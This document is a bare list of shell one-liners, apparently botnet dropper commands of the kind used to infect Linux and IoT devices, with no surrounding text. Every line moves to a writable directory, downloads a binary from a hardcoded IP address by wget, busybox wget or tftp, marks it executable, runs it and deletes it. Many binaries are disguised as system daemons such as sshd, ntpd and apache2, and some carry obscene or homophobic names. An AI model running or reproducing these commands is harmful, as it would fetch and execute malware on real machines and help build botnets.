cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkuryopenssh; chmod +x Merkuryopenssh; ./Merkuryopenssh; rm -rf Merkuryopenssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurybash; chmod +x Merkurybash; ./Merkurybash; rm -rf Merkurybash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurytftp; chmod +x Merkurytftp; ./Merkurytftp; rm -rf Merkurytftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurywget; chmod +x Merkurywget; ./Merkurywget; rm -rf Merkurywget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurycron; chmod +x Merkurycron; ./Merkurycron; rm -rf Merkurycron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkuryftp; chmod +x Merkuryftp; ./Merkuryftp; rm -rf Merkuryftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurypftp; chmod +x Merkurypftp; ./Merkurypftp; rm -rf Merkurypftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurysh; chmod +x Merkurysh; ./Merkurysh; rm -rf Merkurysh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/cock; chmod +x cock; ./cock; rm -rf cock
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/net; chmod +x net; ./net; rm -rf net
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/botnet; chmod +x botnet; ./botnet; rm -rf botnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/swatnet; chmod +x swatnet; ./swatnet; rm -rf swatnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/dicknet; chmod +x dicknet; ./dicknet; rm -rf dicknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/fucknet; chmod +x fucknet; ./fucknet; rm -rf fucknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/cracknet; chmod +x cracknet; ./cracknet; rm -rf cracknet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/weednet; chmod +x weednet; ./weednet; rm -rf weednet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/gaynet; chmod +x gaynet; ./gaynet; rm -rf gaynet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/queernet; chmod +x queernet; ./queernet; rm -rf queernet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/ballnet; chmod +x ballnet; ./ballnet; rm -rf ballnet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/unet; chmod +x unet; ./unet; rm -rf unet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.113.222/yougay; chmod +x yougay; ./yougay; rm -rf yougay
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://78.142.19.216/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/'[CPU]'; chmod +x '[CPU]'; ./'[CPU]'; rm -rf '[CPU]'
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.246.153.186/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay1; chmod +x neoisgay1; ./neoisgay1; rm -rf neoisgay1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay2; chmod +x neoisgay2; ./neoisgay2; rm -rf neoisgay2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay3; chmod +x neoisgay3; ./neoisgay3; rm -rf neoisgay3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay4; chmod +x neoisgay4; ./neoisgay4; rm -rf neoisgay4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay5; chmod +x neoisgay5; ./neoisgay5; rm -rf neoisgay5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay6; chmod +x neoisgay6; ./neoisgay6; rm -rf neoisgay6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay7; chmod +x neoisgay7; ./neoisgay7; rm -rf neoisgay7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay8; chmod +x neoisgay8; ./neoisgay8; rm -rf neoisgay8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay9; chmod +x neoisgay9; ./neoisgay9; rm -rf neoisgay9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay10; chmod +x neoisgay10; ./neoisgay10; rm -rf neoisgay10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay11; chmod +x neoisgay11; ./neoisgay11; rm -rf neoisgay11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay12; chmod +x neoisgay12; ./neoisgay12; rm -rf neoisgay12
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.116.237.97/neoisgay13; chmod +x neoisgay13; ./neoisgay13; rm -rf neoisgay13
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 198.167.136.131;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 198.167.136.131;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 198.167.136.131;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 198.167.136.131;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 198.167.136.131;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 198.167.136.131;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 198.167.136.131;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 198.167.136.131;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 198.167.136.131;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 198.167.136.131;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r [cpu] -g 198.167.136.131;cat [cpu] >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 198.167.136.131;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 198.167.136.131;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks1; chmod +x ponydicks1; ./ponydicks1; rm -rf ponydicks1
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks2; chmod +x ponydicks2; ./ponydicks2; rm -rf ponydicks2
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks3; chmod +x ponydicks3; ./ponydicks3; rm -rf ponydicks3
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks4; chmod +x ponydicks4; ./ponydicks4; rm -rf ponydicks4
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks5; chmod +x ponydicks5; ./ponydicks5; rm -rf ponydicks5
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks6; chmod +x ponydicks6; ./ponydicks6; rm -rf ponydicks6
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks7; chmod +x ponydicks7; ./ponydicks7; rm -rf ponydicks7
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks8; chmod +x ponydicks8; ./ponydicks8; rm -rf ponydicks8
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks9; chmod +x ponydicks9; ./ponydicks9; rm -rf ponydicks9
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks10; chmod +x ponydicks10; ./ponydicks10; rm -rf ponydicks10
cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.166.185.124/ponydicks11; chmod +x ponydicks11; ./ponydicks11; rm -rf ponydicks11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/pwget; chmod +x pwget; ./pwget; rm -rf pwget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.103/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats -g 87.121.98.34;cat Cheats >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats2 -g 87.121.98.34;cat Cheats2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats3 -g 87.121.98.34;cat Cheats3 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats4 -g 87.121.98.34;cat Cheats4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats5 -g 87.121.98.34;cat Cheats5 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats6 -g 87.121.98.34;cat Cheats6 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats7 -g 87.121.98.34;cat Cheats7 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats8 -g 87.121.98.34;cat Cheats8 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats9 -g 87.121.98.34;cat Cheats9 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats10 -g 87.121.98.34;cat Cheats10 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats11 -g 87.121.98.34;cat Cheats11 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats12 -g 87.121.98.34;cat Cheats12 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/ntpd; wget http://107.150.48.174/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/sshd; wget http://107.150.48.174/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/openssh; wget http://107.150.48.174/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/bash; wget http://107.150.48.174/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/tftp; wget http://107.150.48.174/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/wget; wget http://107.150.48.174/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/cron; wget http://107.150.48.174/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/ftp; wget http://107.150.48.174/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/pftp; wget http://107.150.48.174/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/sh; wget http://107.150.48.174/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/[cpu]; wget http://107.150.48.174/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/apache2; wget http://107.150.48.174/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://107.150.48.174/telnetd; wget http://107.150.48.174/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.178/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.7.129/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.7.129/sshd; chmod +x sshd; ./sshd; rm -rf sshd
